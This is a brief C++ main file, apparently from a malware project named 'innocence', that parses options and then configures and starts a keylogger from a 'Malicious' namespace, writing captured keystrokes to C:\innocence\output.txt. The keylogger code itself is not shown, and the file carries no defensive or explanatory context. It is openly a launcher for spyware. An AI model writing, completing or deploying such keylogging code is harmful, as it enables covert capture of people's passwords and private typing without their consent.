#include <log/Log.hpp>
#include <malicious/Keylogger.hpp>
#include <system/Process.hpp>
#include <common/ParseOptions.hpp>
#include <audit/Audit.hpp>

int submain(int argc, char ** argv)
{
	try
	{
		LOG.setIdentity(Common::identity);
		Common::ParseOptions(argc, argv);
		Malicious::Keylogger::instance().setKeylog("C:\\innocence\\output.txt");
		Malicious::Keylogger::instance().start();
	}
	catch(Common::Exception&)
	{
	}
	CATCH_UNKNOWN_EXCEPTION
	system("pause");
	return EXIT_SUCCESS;
}

INNOCENCE_MAIN